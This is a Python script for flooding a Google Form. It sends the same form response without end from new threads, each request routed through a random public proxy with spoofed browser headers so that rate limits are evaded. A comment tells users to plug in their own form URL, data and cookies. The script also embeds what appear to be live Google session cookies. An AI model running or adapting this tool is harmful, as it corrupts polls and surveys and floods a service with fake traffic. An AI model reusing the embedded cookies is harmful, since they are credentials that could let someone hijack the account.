import requests
import time
import threading
import random

"""
Change This fields and Your are set to Rock! (Script works, but you may have difficulty finding correct details, only 4 needed. Make an issue, I will help.)
url: your form url # URL must be response URL, sample is provided
Referer: Take by Filling a response
Cookie: Take by filling a response
DATA: Fill a form and find it :)
proxys: fresh proxys (Use fastProxy library from PyPi... made my me :))
"""


URL = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSeyScxCI3U9AzfkwCaXfGZzJnTa2CktXAF8v-suxXWZr8wjnA/formResponse'
#'https://docs.google.com/forms/d/e/1FAIpQLScV70rqvGjDwLnPUJ-YdMNF0I_gVTXpT0_hLtVRL_yLb4ljBA/formResponse'
DATA = 'entry.1233386957=hph&entry.1826514245=Text1&dlut=1634337499261&fvv=1&draftResponse=%5Bnull%2Cnull%2C%22-1661284013293901974%22%5D&pageHistory=0&fbzx=-1661284013293901974'
#'entry.2046702074=answer2&fvv=1&draftResponse=%5Bnull%2Cnull%2C%22700526258680781707%22%5D%0D%0A&pageHistory=0&fbzx=700526258680781707'
REFERER = 'https://docs.google.com/forms/d/e/1FAIpQLSeyScxCI3U9AzfkwCaXfGZzJnTa2CktXAF8v-suxXWZr8wjnA/viewform?fbzx=-1661284013293901974'
#'https://docs.google.com/forms/d/e/1FAIpQLScV70rqvGjDwLnPUJ-YdMNF0I_gVTXpT0_hLtVRL_yLb4ljBA/viewform?fbzx=700526258680781707'
COOKIE ='S=spreadsheet_forms=VT8ij8RV8wjzdSDmj-mWegtrhiOc4nbJsB4F8QTSSzI; CONSENT=YES+srp.gws-20211007-0-RC1.de+FX+240; 1P_JAR=2021-10-15-22; SID=DAjUO1W4QEXA4SPG7yW7JLetVJsuP2B_2n2rQFaPKTpQ26LJhL4fzclx-jRhKxT8MU9rdg.; __Secure-1PSID=DAjUO1W4QEXA4SPG7yW7JLetVJsuP2B_2n2rQFaPKTpQ26LJczP30-952JX9keDdou3Byg.; __Secure-3PSID=DAjUO1W4QEXA4SPG7yW7JLetVJsuP2B_2n2rQFaPKTpQ26LJd_twI3wRXg6WYmz0X0TDsQ.; HSID=A0epOYN5AFT0R4B2y; SSID=AwCjl8YXpaG3Gwu-w; APISID=WnAF8DqO4Z9Tu9qZ/AjDoDkIghT4Q3oh6z; SAPISID=8R-NC_Xr4sIpjwX4/AK2GVNoH3MJAFDSJT; __Secure-1PAPISID=8R-NC_Xr4sIpjwX4/AK2GVNoH3MJAFDSJT; __Secure-3PAPISID=8R-NC_Xr4sIpjwX4/AK2GVNoH3MJAFDSJT; SEARCH_SAMESITE=CgQI45MB; NID=511=dcXB3DtZqycx08XJwhokgCL7Pu8XE2RC7aB4chwhJfBlEhD1jGs05jhOdPcM56G2vVtov1Mt77xq_D7VLjFDrg015_FzOqe7TCh9gHhot3BY2vZpP2bYaTAdtLO-Mv3pK-X5IZyc-VewmHpowLkLafrGBMs_AKEQC408kQjv6DGgpu5m13z3gkmGBM9g7z1lFOzKJqnFE1AuXbP_PU7Nk0VsmW4bbOgHZNnA8skr3ZN-; OGPC=19022519-1:; SIDCC=AJi4QfFPByTOZwF5SUOab70Vr2WHThhBcExFH8QT7INBW3IuWb6E32-o4_RBb8dTTREmrg_Ukw; __Secure-3PSIDCC=AJi4QfGhSwRkmbu8tHEWVh7YWMXFCCx6vH-wGz579D2Dsld2TrTUfoC3nMtFSNuZSKj1vcZnFA'
#'S=spreadsheet_forms=BXegCHIeTgQU35TMDuO3W3FH3gtwNp9-iSHEQzpAbBk; NID=204=ecClXfGHi-YRCDrpb8AbnBtxNexVQUE-ypUTe-fnrRz27zOesoZ0rWzdVxibZn9Ous_oekVOdLsLmsHMWCJwfmJEZkbfXPugn-wZgzhWjgC_trelE25Dt7hZ4lsgadBy6SJEhwbC_FD-6i_ckwpgBzFjsSacjA0pUpoE8lNtfu8; 1P_JAR=2020-05-23-16'


HEADER = {
    'Host': 'docs.google.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://docs.google.com',
    'Referer': REFERER,
    'Cookie': COOKIE,
    'Upgrade-Insecure-Requests':'1'
    }


proxys = ['144.217.101.242:3129', '192.41.71.204:3128', '192.41.13.71:3128', '104.154.143.77:3128', '205.126.14.166:8009', \
           '205.126.14.170:8009', '205.126.14.171:8009', '163.172.189.32:8811', '134.122.67.188:3128', '51.158.180.179:8811', \
           '163.172.136.226:8811', '80.187.140.26:8080', '205.126.14.167:8009', '51.158.107.202:8811', '51.158.78.179:8811', \
           '163.172.146.119:8811', '51.158.68.26:8811', '188.165.16.230:3129', '51.158.186.242:8811', '95.179.200.239:30963', \
           '139.180.184.204:3128', '91.202.240.208:51678', '81.16.10.141:38132', '82.200.233.4:3128', '202.40.177.69:80', \
           '139.162.47.109:143', '91.230.227.168:3128', '51.158.123.35:8811', '103.81.114.182:53281']




def trouble():
    try:
        proxy = proxys[random.choice([x for x in range(len(proxys))])]
        r = requests.post(URL, proxies={'http':proxy, 'https':proxy}, data=DATA, headers=HEADER)
        print(r.status_code)
    except Exception as e:
        print(str(e))

while True:
    threading.Thread(target=trouble).start()
